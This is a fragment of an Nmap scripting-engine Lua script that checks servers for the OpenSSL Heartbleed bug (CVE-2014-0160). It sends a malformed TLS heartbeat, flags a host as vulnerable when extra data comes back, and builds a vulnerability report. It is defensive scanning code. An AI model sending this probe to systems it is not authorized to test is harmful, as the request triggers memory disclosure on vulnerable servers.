      stdnse.print_debug(1, 'Server returned error, likely not vulnerable')
      break
    end
  end

  s:send(hb3)
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(1, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(1, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(1, 'Server returned error, likely not vulnerable')
      break
    end
  end





end

action = function(host, port)
  local vuln_table = {
    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    prop = "booya",
    description = [[
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    ]],

    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local test_vers = arg_protocols

  if type(test_vers) == 'string' then
    test_vers = { test_vers }
  end

  for _, ver in ipairs(test_vers) do
    if nil == tls.PROTOCOLS[ver] then
      return "\n  Unsupported protocol version: " .. ver
    end
    local status = testversion(host, port, ver)
    if ( status ) then
      vuln_table.state = vulns.STATE.VULN
      break
    end
  end

  return report:make_output(vuln_table)
end
